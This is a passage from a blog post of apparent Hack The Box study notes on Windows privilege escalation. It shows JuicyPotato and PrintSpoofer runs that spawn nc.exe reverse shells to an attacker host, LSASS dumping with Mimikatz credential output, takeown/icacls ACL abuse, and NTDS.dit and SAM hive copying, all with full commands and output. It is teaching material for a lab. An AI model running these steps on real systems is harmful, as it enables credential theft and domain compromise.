SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled   
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled    
SeManageVolumePrivilege       Perform volume maintenance tasks          Enabled    
SeImpersonatePrivilege        Impersonate a client after authentication Enabled    
SeCreateGlobalPrivilege       Create global objects                     Enabled    
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled   </code></pre>
<p>command <code>whoami /priv</code> Confirm<a href="https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/seimpersonateprivilege-secreateglobalprivilege" rel="noreferrer" target="_blank">SeImpersonatePrivilege</a> has been listed. This privilege can be used to impersonate e.g.<code>NT AUTHORITY\SYSTEM</code> and other privileged accounts.<a href="https://github.com/ohpe/juicy-potato" rel="noreferrer" target="_blank">JuicyPotato</a> Can be exploited via DCOM/NTLM reflection abuse <code>SeImpersonate</code> or <code>SeAssignPrimaryToken</code> permissions.</p>
<p>In order to take advantage of these permissions to escalate privileges, first download <code>JuicyPotato.exe</code> binary file and upload it, and <code>nc.exe</code> to the target server. Next, create a Netcat listener on port 8443 and execute the following command, where <code>-l</code> is the COM server listening port,<code>-p</code> Is the startup program (cmd.exe),<code>-a</code> are the parameters passed to cmd.exe,<code>-t</code> Yes <code>createprocess</code> call. Below, we tell the tool to try both<a href="https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw" rel="noreferrer" target="_blank">CreateProcessWithTokenW</a> and<a href="https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessasusera" rel="noreferrer" target="_blank">CreateProcessAsUser</a> function, both of which require <code>SeImpersonate</code> or <code>SeAssignPrimaryToken</code> permissions.</p>
<ol><li>Escalating Privileges Using JuicyPotato</li></ol>
<pre><code class="language-shell-session">SQL&gt; xp_cmdshell c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.15.38 8443 -e cmd.exe" -t *

output                                                                             

--------------------------------------------------------------------------------   

Testing {4991d34b-80a1-4291-83b6-3328366b9097} 53375                               
                                                                            
[+] authresult 0                                                                   
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM                                                                                                    
[+] CreateProcessWithTokenW OK                                                     
[+] calling 0x000000000088ce08</code></pre>
<p>This process completed successfully and received a message named <code>NT AUTHORITY\SYSTEM</code> shell.</p>
<ol><li>Catching SYSTEM Shell</li></ol>
<pre><code class="language-shell-session">Chenduoduo@htb[/htb]$ sudo nc -lnvp 8443

listening on [any] 8443...
connect to [10.10.14.3] from (UNKNOWN) [10.129.43.30] 50332
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.


C:\Windows\system32&gt;whoami

whoami
nt authority\system


C:\Windows\system32&gt;hostname

hostname
WINLPE-SRV01</code></pre>
<p><strong>PringSpoofer and RoguePotato</strong> JuicyPotato does not support Windows Server 2019 and Windows 10 version 1809 and later. However,<a href="https://github.com/itm4n/PrintSpoofer" rel="noreferrer" target="_blank">PrintSpoofer</a> and<a href="https://github.com/antonioCoco/RoguePotato" rel="noreferrer" target="_blank">RoguePotato</a> You can also use the same permissions to obtain <code>NT AUTHORITY\SYSTEM</code> level of access. This blog post goes into depth <code>PrintSpoofer</code> Tool that can be used to abuse impersonation permissions on Windows 10 and Server 2019 hosts, JuicyPotato no longer works properly.</p>
<p>Let's use <code>PrintSpoofer</code> Try the tool. We can use this tool to spawn and interact with a SYSTEM process in your current console, spawn a SYSTEM process on the desktop (if logged in locally or via RDP), or capture a reverse shell - which we will do in our example. Likewise, connect <code>mssqlclient.py</code>, use with <code>-c</code> Parameters for the tool execution command. Here, use <code>nc.exe</code> Generate a reverse shell (Netcat listener waiting for our attack box on port 8443).</p>
<ol><li>Escalating Privilege using PrintSpoofer</li></ol>
<pre><code class="language-shell-session">SQL&gt; xp_cmdshell c:\tools\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.15.38 8443 -e cmd"

output                                                                             

--------------------------------------------------------------------------------   

[+] Found privilege: SeImpersonatePrivilege                                        

[+] Named pipe listening...                                                        

[+] CreateProcessAsUser() OK                                                       

NULL </code></pre>
<p>If all goes well, our netcat listener will have a SYSTEM shell.</p>
<ol><li>Catching Reverse Shell as SYSTEM</li></ol>
<pre><code class="language-shell-session">Chenduoduo@htb[/htb]$ nc -lnvp 8443

listening on [any] 8443...
connect to [10.10.14.3] from (UNKNOWN) [10.129.43.30] 49847
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.


C:\Windows\system32&gt;whoami

whoami
nt authority\system</code></pre>
<h3>SeDebugPrivilege debugging permissions</h3>
<p>Users may be assigned in order to run a specific application or service or to assist with troubleshooting<a href="https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/debug-programs" rel="noreferrer" target="_blank">SeDebugPrivilege</a>, instead of adding the account to the Administrators group. This permission can be set through local or domain group policy in <code>Computer Settings &gt; Windows Settings &gt; Security Settings</code>. By default, only administrators have this permission, as it can be used to capture sensitive information from system memory, or to access/modify kernel and application structures. This right may be assigned to developers who need to debug new system components as part of their daily work. This user right should be granted with caution, as any assigned account will have access to critical operating system components.</p>
<p>In internal penetration testing, it is often helpful to utilize sites such as LinkedIn to gather information about potential users for targeting purposes. Assume we are using <code>Responder</code> or <code>Inveigh</code> Get many NTLMv2 password hashes. In this case, we might want to focus our efforts to crack password hashes on potentially high-value accounts, such as developers who are more likely to be assigned such permissions. A user may not be a local administrator of the host, but have rights that we cannot enumerate remotely with tools like BloodHound. This is worth checking in an environment where we are obtaining credentials for multiple users and have RDP access to one or more hosts but no additional permissions.</p>
<img alt="Pasted image 20260228032219" src="assets/posts/windows-privilege-escalation/Pasted image 20260228032219.png"/>
<p>As assigned to debug <code>programs</code> After logging in as a user with privileges and opening an elevated shell, we see <code>SeDebugPrivilege</code> be listed.</p>
<pre><code class="language-cmd-session">C:\htb&gt; whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
========================================= ================================================================== ========
SeDebugPrivilege                          Debug programs                                                     Disabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set      </code></pre>
<p>we can use<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite" rel="noreferrer" target="_blank">SysInternals</a> in the kit<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/procdump" rel="noreferrer" target="_blank">ProcDump</a> To take advantage of this permission, dump process memory. A good candidate is the Local Security Administration Subsystem Service (<a href="https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service" rel="noreferrer" target="_blank">LSASS</a>) process, which stores user credentials after the user logs into the system.</p>
<pre><code class="language-cmd-session">C:\htb&gt; procdump.exe -accepteula -ma lsass.exe lsass.dmp

ProcDump v10.0 - Sysinternals process dump utility
Copyright (C) 2009-2020 Mark Russinovich and Andrew Richards
Sysinternals - www.sysinternals.com

[15:25:45] Dump 1 initiated: C:\Tools\Procdump\lsass.dmp
[15:25:45] Dump 1 writing: Estimated dump file size is 42 MB.
[15:25:45] Dump 1 complete: 43 MB written in 0.5 seconds
[15:25:46] Dump count reached.</code></pre>
<p>This worked and we can <code>Mimikatz</code> used in <code>sekurlsa:: minidump</code> The command loads. sending <code>sekurlsa:: logonPasswords</code> command, we obtained the NTLM hash of the local administrator account logged in locally. We can exploit this method to conduct a "pass the hash" attack, if the same local administrator password is used on one or more additional systems (common in large organizations), allowing for lateral movement.</p>
<p>Note: Before running any command in "Mimikatz", it is best to enter "log" first, so that all command output will generate a ".txt" file. This is especially useful when exporting credentials from a server where multiple sets of credentials may exist.</p>
<pre><code class="language-cmd-session">C:\htb&gt; mimikatz.exe.#####.   mimikatz 2.2.0 (x64) #19041 Sep 18 2020 19:18:29.## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY \`gentilkiwi\` (benjamin@gentilkiwi.com )
 ## \ / ##       &gt; https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             (vincent.letoux@gmail.com )
  '#####'        &gt; https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # log
Using 'mimikatz.log' for logfile: OK

mimikatz # sekurlsa::minidump lsass.dmp
Switch to MINIDUMP: 'lsass.dmp'

mimikatz # sekurlsa::logonpasswords
Opening: 'lsass.dmp' file for minidump...

Authentication Id: 0; 23196355 (00000000:0161f2c3)
Session: Interactive from 4
User Name: DWM-4
Domain: Window Manager
Logon Server: (null)
Logon Time: 3/31/2021 3:00:57 PM
SID: S-1-5-90-0-4
        msv:
        tspkg:
        wdigest:
         * Username: WINLPE-SRV01$
         * Domain: WORKGROUP
         * Password: (null)
        kerberos:
        ssp:
        credman:

&lt;SNIP&gt; 

Authentication Id: 0; 23026942 (00000000:015f5cfe)
Session: RemoteInteractive from 2
User Name: jordan
Domain: WINLPE-SRV01
Logon Server: WINLPE-SRV01
Logon Time: 3/31/2021 2:59:52 PM
SID: S-1-5-21-3769161915-3336846931-3985975925-1000
        msv:
         [00000003] Primary
         * Username: jordan
         * Domain: WINLPE-SRV01
         * NTLM: cf3a5525ee9414229e66279623ed5c58
         * SHA1: 3c7374127c9a60f9e5b28d3a343eb7ac972367b2
        tspkg:
        wdigest:
         * Username: jordan
         * Domain: WINLPE-SRV01
         * Password: (null)
        kerberos:
         * Username: jordan
         * Domain: WINLPE-SRV01
         * Password: (null)
        ssp:
        credman:

&lt;SNIP&gt;</code></pre>
<p>Let's say we are unable to load the tool on the target for some reason, but have RDP access. In this case we can manually dump via Task Manager <code>LSASS</code> process by browsing "<code>Details</code> " label, select <code>LSASS</code> process and select <code>Create dump file</code>. After downloading this file back to the attack system, we can process it with Mimikatz, just like in the previous example.</p>
<img alt="Pasted image 20260228035858" src="assets/posts/windows-privilege-escalation/Pasted image 20260228035858.png"/>
<p><strong>First use procdump.exe to run the lsass.exe program, then dump the dump file to the same directory as mimikatz.exe, and run mimikatz.exe. After executing these three commands <code>log</code> <code>sekurlsa::minidump lsass.dmp</code> <code>sekurlsa::logonpasswords</code>, you can get the HTML hash</strong></p>
<p><strong>Remote code execution as SYSTEM</strong> We can also use <code>SeDebugPrivilege</code> to realize<a href="https://decoder.cloud/2018/02/02/getting-system/" rel="noreferrer" target="_blank">RCE</a>. Using this technique, we can start a subprocess by <code>SeDebugPrivilege</code> Grant elevated privileges to the account, alter normal system behavior, inherit the token of the parent process and impersonate it, thereby elevating privileges to SYSTEM. If we run the parent process as SYSTEM (specifying the target process or the process ID (or PID) of the running program, then we can quickly escalate privileges. Let's see it in action.</p>
<p>First, transfer this PoC script to the target system. Next we just load the script and use the following syntax <code>[MyProcess]::CreateProcessFromParent(&lt;system_pid&gt;,&lt;command_to_execute&gt;,"")</code> run. Note that we have to add a third empty parameter at the end <code>""</code>, so that the PoC can work properly.</p>
<p>First, open an elevated PowerShell console (right-click, run as administrator, enter <code>Jordan</code> user's credentials). Next, enter <code>tasklist</code>, gets a list of running processes and their associated PIDs.</p>
<pre><code class="language-PowerShell-session">PS C:\htb&gt; tasklist 

Image Name                     PID Session Name        Session#    Mem Usage
========================= ======== ================ =========== ============
System Idle Process              0 Services                   0          4 K
System                           4 Services                   0        116 K
smss.exe                       340 Services                   0      1,212 K
csrss.exe                      444 Services                   0      4,696 K
wininit.exe                    548 Services                   0      5,240 K
csrss.exe                      556 Console                    1      5,972 K
winlogon.exe                   612 Console                    1     10,408 K</code></pre>
<p>Here we can target the system running under PID 612<code>winlogon.exe</code>, we know it runs as SYSTEM on the Windows host.</p>
<p>We can also use<a href="https://docs.microsoft.com/en-us/PowerShell/module/microsoft.PowerShell.management/get-process?view=PowerShell-7.2" rel="noreferrer" target="_blank">Get-Process</a> The cmdlet grabs the PID of a well-known process (such as LSASS) and passes it directly to the script, reducing the number of steps required.</p>
<img alt="Pasted image 20260228040031" src="assets/posts/windows-privilege-escalation/Pasted image 20260228040031.png"/>
<p>There are also tools like this, which can be found in our <code>SeDebugPrivilege</code> The SYSTEM shell pops up. Typically we don't have access to the host via RDP, so the PoC must be modified, either by reverse shelling back to the attacking host as SYSTEM, or via other commands, such as adding an admin user. Try playing around with these PoCs and see what other ways you can achieve SYSTEM access, especially if you don't have a fully interactive session, such as implementing command injection, or as <code>SeDebugPrivilege</code> of users have a web shell or reverse shell connection. Keep these examples in mind in case you run into a situation where dumping LSASS fails to obtain useful credentials (although we can gain SYSTEM access via the machine's NTLM hash, but that's beyond the scope of this module), and using a shell or RCE as SYSTEM can be helpful.</p>
<h3>SeTakeOwnershipPrivilege Get ownership permissions</h3>
<p><a href="https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/take-ownership-of-files-or-other-objects" rel="noreferrer" target="_blank">SeTakeOwnershipPrivilege</a> Give users ownership of any "protectable object", i.e. Active Directory objects, NTFS files/folders, printers, registry keys, services, and processes. This permission is given to<a href="https://docs.microsoft.com/en-us/windows/win32/secauthz/standard-access-rights" rel="noreferrer" target="_blank">WRITE_OWNER</a> Rights on an object, meaning the user can change the owner within the object's security descriptor. Administrators are granted this permission by default. While it is rare to encounter a standard user account with this permission, we may encounter, for example, a service account that is given this permission and is responsible for running backup jobs and VSS snapshots. It may also be assigned to some other account, such as <code>SeBackupPrivilege</code>、<code>SeRestorePrivilege</code> and <code>SeSecurityPrivilege</code>, to control the account's permissions more granularly without giving the account full local administrator rights. These privileges themselves may well be used to escalate privileges. However, sometimes we may be responsible for a specific file because other methods are blocked, or other methods don't work as expected. There's something special about abusing that privilege. Still, it's worth the in-depth understanding, especially since in an Active Directory environment we may encounter a scenario where we can assign this right to a specific user and use it to read sensitive files on a file share.</p>
<p><strong>WRITE_OWNER permission</strong> means:</p>
<blockquote>You can modify the object's Owner field.</blockquote>
<p>Pay attention to a key logic:<strong>Windows has a hidden rule:</strong> <strong>The owner of the object has natural rights to modify the DACL.</strong> So the attack chain is:</p>
<ol><li>You use SeTakeOwnershipPrivilege to "grab" the file</li><li>You become the Owner</li><li>As Owner, you can modify the ACL</li><li>Give yourself Full Control</li><li>Then read and write casually</li></ol>
<p>This is where it gets dangerous.</p>
<img alt="Pasted image 20260228044423" src="assets/posts/windows-privilege-escalation/Pasted image 20260228044423.png"/>
<p>This setting can be set in Group Policy:</p>
<p><code>Computer Configuration</code> ⇾ <code>Windows Settings</code> ⇾ <code>Security Settings</code> ⇾ <code>Local Policies</code> ⇾ <code>User Rights Assignment</code></p>
<ul><li><code>Computer Configuration</code> ⇾ <code>Windows Settings</code> ⇾ <code>Security Settings</code> ⇾ <code>Local Policies</code> ⇾ <code>User Rights Assignment</code></li></ul>
<img alt="Pasted image 20260228044443" src="assets/posts/windows-privilege-escalation/Pasted image 20260228044443.png"/>
<p>With this permission, the user can take ownership of any file or object and perform operations involving sensitive data access,<code>remote code execution</code>  (<code>RCE</code>) or <code>denial of service</code> (DOS) changes.</p>
<p>Suppose we encounter a user with this permission, or by using<a href="https://github.com/FSecureLABS/SharpGPOAbuse" rel="noreferrer" target="_blank">SharpGPOAbuse</a> Attacks such as GPO abuse grant this permission. In this case, we can use this permission to control shared folders or sensitive files, such as documents containing passwords or SSH keys.</p>
<p><strong>Leveraging the Privilege</strong></p>
<ol><li>Review current user permissions</li></ol>
<pre><code class="language-PowerShell-session">PS C:\htb&gt; whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                                              State
============================= ======================================================= ========
SeTakeOwnershipPrivilege      Take ownership of files or other objects                Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                                Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set                          Disabled</code></pre>
<p>Notice from the output that this permission is not enabled. We can enable it using this script, which is detailed in this blog post, or this script, which is based on the original concept.</p>
<ol><li>Enabling SeTakeOwnershipPrivilege</li></ol>
<pre><code class="language-PowerShell-session">PS C:\htb&gt; Import-Module.\Enable-Privilege.ps1
PS C:\htb&gt;.\EnableAllTokenPrivs.ps1
PS C:\htb&gt; whoami /priv

PRIVILEGES INFORMATION
----------------------
Privilege Name                Description                              State
============================= ======================================== =======
SeTakeOwnershipPrivilege      Take ownership of files or other objects Enabled
SeChangeNotifyPrivilege       Bypass traverse checking                 Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set           Enabled</code></pre>
<pre><code>PS C:\TakeOwn&gt; icacls C:\TakeOwn\flag.txt /grant "$env:USERNAME\`:(F)"
processed file: C:\TakeOwn\flag.txt
Successfully processed 1 files; Failed processing 0 files
PS C:\TakeOwn&gt; type flag.txt
1m_th3_f1l3_0wn3r_n0W!
PS C:\TakeOwn&gt;
</code></pre>
<p>Next, select a target file and confirm current ownership. For our purposes, we'll be targeting an interesting file found on a file share. Common files <code>Sharing is public</code> and <code>private</code> Directory, with subdirectories set up by departments. Given a user's role in the company, they often have access to specific files or directories. Even with such a structure in place, system administrators can misconfigure directory and subdirectory permissions, making file shares a rich source of information for us to obtain Active Directory credentials (sometimes even without credentials). In our scenario, let’s assume we have access to the target company’s file share and can freely browse <code>private</code> and <code>public</code> subdirectory. In most cases, we found that permissions were set very restrictively and no information about file sharing was found.<code>public</code> section has any interesting information. Browsing <code>private</code> section, we found that all domain users could list the contents of certain subdirectories, but when trying to read the contents of most files received <code>access denied</code> tips. During the enumeration process, we <code>private</code> shared folder <code>IT</code> A file named <code>cred.txt</code> file.</p>
<ol><li>Select target file</li></ol>
<p>Given that our user account has <code>SeTakeOwnershipPrivilege</code>(may have been granted), or we exploited other misconfiguration, such as an overly permissive Group Policy Object (GPO) granting that permission), we could exploit it to read arbitrary files.</p>
<p>Let’s take a look at our target profile to get more relevant information.</p>
<pre><code class="language-PowerShell-session">PS C:\htb&gt; Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | Select Fullname,LastWriteTime,Attributes,@{Name="Owner";Expression={ (Get-Acl $_.FullName).Owner }}
 
FullName                                 LastWriteTime         Attributes Owner
--------                                 -------------         ---------- -----
C:\Department Shares\Private\IT\cred.txt 6/18/2021 12:23:28 PM    Archive</code></pre>
<p>We can see that the owner is not shown, which means we may not have enough permissions to see these details. We can rewind a bit and look up the owner of the IT directory.</p>
<ol><li>Check file ownership</li></ol>
<pre><code class="language-PowerShell-session">PS C:\htb&gt; cmd /c dir /q 'C:\Department Shares\Private\IT'

 Volume in drive C has no label.
 Volume Serial Number is 0C92-675B
 
 Directory of C:\Department Shares\Private\IT
 
06/18/2021  12:22 PM    &lt;DIR&gt;          WINLPE-SRV01\sccm_svc.
06/18/2021  12:22 PM    &lt;DIR&gt;          WINLPE-SRV01\sccm_svc..
06/18/2021  12:23 PM                36...                    cred.txt
               1 File(s)             36 bytes
               2 Dir(s)  17,079,754,752 bytes free</code></pre>
<p>We can see that the IT share appears to belong to a service account and does contain a file <code>cred.txt</code> There is some data in it.</p>
<p>Now we can use<a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/takeown" rel="noreferrer" target="_blank">Takeown</a> Windows binary to change the ownership of a file.</p>
<ol><li>Take over ownership of files</li></ol>
<pre><code class="language-PowerShell-session">PS C:\htb&gt; takeown /f 'C:\Department Shares\Private\IT\cred.txt'
 
SUCCESS: The file (or folder): "C:\Department Shares\Private\IT\cred.txt" now owned by user "WINLPE-SRV01\htb-student".</code></pre>
<p>We can confirm ownership using the same command from before. We now see that our user account is the file owner.</p>
<ol><li>Confirm ownership change</li></ol>
<pre><code class="language-PowerShell-session">PS C:\htb&gt; Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | select name,directory, @{Name="Owner";Expression={(Get-ACL $_.Fullname).Owner}}
 
Name     Directory                       Owner
----     ---------                       -----
cred.txt C:\Department Shares\Private\IT WINLPE-SRV01\htb-student</code></pre>
<p>We may still be unable to read the file and need to use <code>ICACL</code> Modify the file ACL to read.</p>
<ol><li>Modify the ACL of the file</li></ol>
<pre><code class="language-PowerShell-session">PS C:\htb&gt; cat 'C:\Department Shares\Private\IT\cred.txt'

cat: Access to the path 'C:\Department Shares\Private\IT\cred.txt' is denied.
At line:1 char:1
+ cat 'C:\Department Shares\Private\IT\cred.txt'
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo: PermissionDenied: (C:\Department Shares\Private\IT\cred.txt:String) [Get-Content], Unaut
   horizedAccessException
    + FullyQualifiedErrorId: GetContentReaderUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetContentCommand</code></pre>
<p>We first give the user full permissions on the target file.</p>
<pre><code class="language-PowerShell-session">PS C:\htb&gt; icacls 'C:\Department Shares\Private\IT\cred.txt' /grant htb-student:F

processed file: C:\Department Shares\Private\IT\cred.txt
Successfully processed 1 files; Failed processing 0 files</code></pre>
<p>If all goes as planned, we can now read the target file from the command line, open it if we have RDP permissions, or copy it to our attack system for additional processing (such as cracking the password for the KeePass database).</p>
<ol><li>read file</li></ol>
<pre><code class="language-PowerShell-session">PS C:\htb&gt; cat 'C:\Department Shares\Private\IT\cred.txt'

NIX01 admin
 
root:n1X_p0wer_us3er!</code></pre>
<p>Once these changes are made, we make every effort to restore permissions and file ownership. If for some reason this is not possible, we shall notify the client and document the modifications in detail in an appendix to the report deliverables. Again, taking advantage of this permission may be considered disruptive behavior and must be done with great caution. Some customers may want us to log the ability to perform this action as evidence of a misconfiguration, but we will not fully exploit this vulnerability due to the potential impact.</p>
<p><strong>When to use?</strong> Noteworthy documents</p>
<pre><code class="language-shell-session">c:\inetpub\wwwwroot\web.config
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav</code></pre>
<h2>Windows group permissions</h2>
<p><strong>Windows Built-in</strong></p>
<p>Such as <code>Windows permissions overview</code> As mentioned in the section, Windows servers, especially domain controllers, have various groups built into them that either come with the operating system or are added when the system installs the Active Directory Domain Services role to promote the server to a domain controller. Many of these organizations grant members special privileges, and some can even be used to elevate the privileges of a server or domain controller. All built-in Windows groups are listed here with a detailed description of each group. This page details the list of privileged accounts and groups in Active Directory. Regardless of whether we have access to one or more of these member accounts, or during the evaluation process find ourselves with excessive/unnecessary membership in one or more of these groups, it is important to understand the impact of membership in these groups. For our purposes, we will focus on the following built-in groups. These groups have existed since Server 2008 R2 to the present day, except for Hyper-V Administrators (introduced in Server 2012).</p>
<p>Accounts can be assigned to these groups to enforce least privileges and avoid creating more domain administrators and enterprise administrators to perform specific tasks such as backups. Sometimes vendor apps also ask for certain permissions, which can be obtained by assigning the service account to one of these groups. Accounts can also be added accidentally, or left behind after testing a specific tool or script. We should always review these groups and append a list of each group member to the report for the client to review and determine whether access is still needed.</p>
<div class="post-table-wrap"><table><thead><tr><th>Spare</th><th>event log reader</th><th>Administrator</th></tr></thead><tbody><tr><td>Administrator</td><td>Print</td><td>server operator</td></tr></tbody></table></div>
<h3>Backup Operators Backup Operators</h3>
<p>After logging into the target machine we can use the command <code>whoami /groups</code> Shows current group members. Members of this group will receive <code>SeBackup</code> and <code>SeRestore</code> privileges.<a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ifs/privileges" rel="noreferrer" target="_blank">SeBackupPrivilege</a> Allows us to iterate through any folder and list the folder contents. This allows us to copy files from the folder even if there is no access control entry (ACE) in the folder's access control list (ACL). However, we cannot achieve this using the standard copy command. Instead, we need to programmatically copy the data and make sure to specify<a href="https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilea" rel="noreferrer" target="_blank">FILE_FLAG_BACKUP_SEMANTICS</a> logo.</p>
<p><strong>How to access sensitive information without obtaining the necessary permissions.</strong></p>
<p>we can use this<a href="https://github.com/giuliano108/SeBackupPrivilege" rel="noreferrer" target="_blank">PoC</a> to take advantage of <code>SeBackupPrivilege</code>, copy this file. First, let's import the library in a PowerShell session.</p>
<ol><li>Importing Libraries</li></ol>
<pre><code class="language-PowerShell-session">PS C:\htb&gt; Import-Module.\SeBackupPrivilegeUtils.dll
PS C:\htb&gt; Import-Module.\SeBackupPrivilegeCmdLets.dll</code></pre>
<p>Let's check if it's enabled <code>SeBackupPrivilege</code>, by calling <code>whoami /priv</code> or <code>Get-SeBackupPrivilege</code> cmdlet. If the permission is disabled, we can use <code>Set-SeBackupPrivilege</code> to enable it. &gt;Note: Depending on the server setup, it may be necessary to generate an elevated CMD prompt to bypass UAC and gain this permission.</p>
<pre><code class="language-PowerShell-session">PS C:\htb&gt; whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeMachineAccountPrivilege     Add workstations to domain     Disabled
SeBackupPrivilege             Back up files and directories  Disabled
SeRestorePrivilege            Restore files and directories  Disabled
SeShutdownPrivilege           Shut down the system           Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled</code></pre>
<pre><code class="language-PowerShell-session">PS C:\htb&gt; Get-SeBackupPrivilege

SeBackupPrivilege is disabled</code></pre>
<p>If the permission is disabled, we can use <code>Set-SeBackupPrivilege</code> to enable it.</p>
<ol><li>Enabling SeBackupPrivilege</li></ol>
<pre><code class="language-PowerShell-session">PS C:\htb&gt; Set-SeBackupPrivilege
PS C:\htb&gt; Get-SeBackupPrivilege

SeBackupPrivilege is enabled</code></pre>
<pre><code class="language-PowerShell-session">PS C:\htb&gt; whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeMachineAccountPrivilege     Add workstations to domain     Disabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Disabled
SeShutdownPrivilege           Shut down the system           Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled</code></pre>
<p>As stated above, this privilege was successfully achieved. Any protected file can now be copied using this permission.</p>
<ol><li>Copying a Protected File</li></ol>
<pre><code class="language-PowerShell-session">PS C:\htb&gt; dir C:\Confidential\

    Directory: C:\Confidential

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         5/6/2021   1:01 PM             88 2021 Contract.txt


PS C:\htb&gt; cat 'C:\Confidential\2021 Contract.txt'

cat: Access to the path 'C:\Confidential\2021 Contract.txt' is denied.
At line:1 char:1
+ cat 'C:\Confidential\2021 Contract.txt'
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo: PermissionDenied: (C:\Confidential\2021 Contract.txt:String) [Get-Content], Unauthor
   izedAccessException
    + FullyQualifiedErrorId: GetContentReaderUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetContentCommand</code></pre>
<pre><code class="language-PowerShell-session">PS C:\htb&gt; Copy-FileSeBackupPrivilege 'C:\Confidential\2021 Contract.txt'.\Contract.txt

Copied 88 bytes


PS C:\htb&gt;  cat.\Contract.txt

Inlanefreight 2021 Contract

==============================

Board of Directors:

&lt;...SNIP...&gt;</code></pre>
<p><strong>Attacking DC - Copying NTDS.dit</strong> This group also allows local logins to domain controllers. active directory database <code>NTDS.dit</code> is a very attractive target because it contains the NTLM hashes of all user and computer objects within the domain. However, the file is locked and inaccessible to non-privileged users.</p>
<p>due to <code>NTDS.dit</code> Files are locked by default, we can use Windows'<a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/diskshadow" rel="noreferrer" target="_blank">diskshadow</a> Tool creation <code>C</code> a shadow copy of the disk and expose it as <code>E</code> plate. NTDS.dit in this shadow copy will not be used by the system.</p>
<pre><code class="language-PowerShell-session">PS C:\htb&gt; diskshadow.exe

Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer:  DC,  10/14/2020 12:57:52 AM

DISKSHADOW&gt; set verbose on
DISKSHADOW&gt; set metadata C:\Windows\Temp\meta.cab
DISKSHADOW&gt; set context clientaccessible
DISKSHADOW&gt; set context persistent
DISKSHADOW&gt; begin backup
DISKSHADOW&gt; add volume C: alias cdrive
DISKSHADOW&gt; create
DISKSHADOW&gt; expose %cdrive% E:
DISKSHADOW&gt; end backup
DISKSHADOW&gt; exit

PS C:\htb&gt; dir E:


    Directory: E:\


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         5/6/2021   1:00 PM                Confidential
d-----        9/15/2018  12:19 AM                PerfLogs
d-r---        3/24/2021   6:20 PM                Program Files
d-----        9/15/2018   2:06 AM                Program Files (x86)
d-----         5/6/2021   1:05 PM                Tools
d-r---         5/6/2021  12:51 PM                Users
d-----        3/24/2021   6:38 PM                Windows</code></pre>
<p>Next, we can use <code>Copy-FileSeBackupPrivilege</code> cmdlet bypasses the ACL and copies NTDS.dit locally.</p>
<ol><li>Copying NTDS.dit Locally</li></ol>
<pre><code class="language-PowerShell-session">PS C:\htb&gt; Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit

Copied 16777216 bytes</code></pre>
<p>&gt;SYSTEM Registry Hives: In Windows,<strong>Registry</strong> It is a hierarchical database used to store system configuration.</p>
<ol><li>Back up SAM and SYSTEM Registry Hives</li></ol>
<p>This permission also allows us to back up SAM and SYSTEM Registry Hives, using Impacket's <code>secretsdump.py</code> Use other tools to extract local account credentials offline</p>
<pre><code class="language-cmd-session">C:\htb&gt; reg save HKLM\SYSTEM SYSTEM.SAV

The operation completed successfully.


C:\htb&gt; reg save HKLM\SAM SAM.SAV

The operation completed successfully.</code></pre>
